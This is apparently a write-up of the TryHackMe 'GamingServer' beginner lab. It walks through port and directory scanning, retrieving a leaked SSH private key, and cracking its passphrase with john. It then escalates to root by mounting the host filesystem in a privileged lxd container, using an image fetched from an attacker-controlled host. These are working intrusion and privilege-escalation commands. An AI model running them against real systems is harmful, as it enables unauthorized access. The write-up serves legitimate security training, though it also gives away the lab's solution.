# [GamingServer](https://tryhackme.com/room/gamingserver)

## An Easy Boot2Root box for beginners

# Boot2Root

## Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system.

### What is the user flag?

1. Start with a comprehensive nmap scan to identify open ports and running services:

```bash
nmap -sV -p- <TARGET_IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Use gobuster to discover hidden directories and files on the web server:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

<img width="893" height="375" alt="SCREEN02" src="https://github.com/user-attachments/assets/44478345-0138-47d7-866c-68d5d1af050f" />

**Key findings:**

- `/secret` - Contains sensitive information

3. Examine the web application for sensitive information:

- Navigate to the main page source code (`view-source:http://<TARGET_IP>/`)
- Find username `john` mentioned in HTML comments
- Discover private RSA key at `/secret/secretKey`

<img width="727" height="45" alt="SCREEN01" src="https://github.com/user-attachments/assets/74405d70-864f-401f-9898-5f5509e5749a" />

4. Crack the RSA key passphrase and establish SSH connection:

```bash
chmod 600 rsa
ssh2john rsa > rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
ssh -i rsa john@<TARGET_IP>
# Passphrase: letmein
cat user.txt
```

<img width="264" height="35" alt="SCREEN03" src="https://github.com/user-attachments/assets/0f966303-b500-4e12-84ae-41332e003c67" />

---

### What is the root flag?

1. Check user group memberships to identify privilege escalation opportunities:

```bash
id
```

```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

The user `john` is a member of the `lxd` group, which can be exploited for privilege escalation.

2. On your attacking machine, download a minimal Alpine Linux container image:

```Bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
python -m http.server
```

3. Transfer and configure the Alpine container for privilege escalation:

```bash
wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
whoami
```

<img width="987" height="336" alt="SCREEN04" src="https://github.com/user-attachments/assets/f1f4c1b7-0735-4e22-9860-97620ea39903" />

4. Locate and read the root flag:

```bash
find / -name "root.txt"
cat /mnt/root/root/root.txt
```

<img width="348" height="81" alt="SCREEN05" src="https://github.com/user-attachments/assets/db1cf0e5-7673-45af-9d49-be6e0bb46d39" />
